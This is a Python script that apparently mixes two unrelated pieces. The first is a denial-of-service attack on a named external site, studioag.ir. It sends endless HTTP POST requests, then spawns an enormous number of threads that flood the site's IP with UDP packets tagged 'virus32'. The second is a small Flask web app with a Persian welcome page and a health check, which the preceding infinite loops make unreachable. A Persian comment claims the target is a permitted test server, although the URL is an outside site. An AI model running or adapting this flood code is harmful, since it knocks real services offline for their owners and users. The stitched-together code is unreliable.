import time
import socket
import sys
import _thread
from flask import Flask, render_template_string
import requests

URL = "https://studioag.ir"  # فقط localhost یا سرور تست با مجوز
TOTAL = 999999999999
session = requests.Session()  # نگهداری اتصال (keep-alive)
for i in range(TOTAL):
    try:
        r = session.post(URL, json={"id": i})
        print(i, r.status_code)
    except Exception as e:
        print("error", i, e)    
site = ("studioag.ir")
thread_count = ("9999999999999999999999999999999")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass

app = Flask(__name__)

TEMPLATE = """
<!doctype html>
<title>My Service</title>
<h1>خوش آمدید</h1>
<p>وضعیت سرویس: {{ status }}</p>
"""

@app.route("/")
def index():
    return render_template_string(TEMPLATE, status="running")

@app.route("/health")
def health():
    return {"status": "ok"}, 200

if __name__ == "__main__":
    # از پورت 8080 استفاده می‌کنیم تا نیاز به دسترسی ریشه نباشد
    app.run(host="0.0.0.0", port=8080)
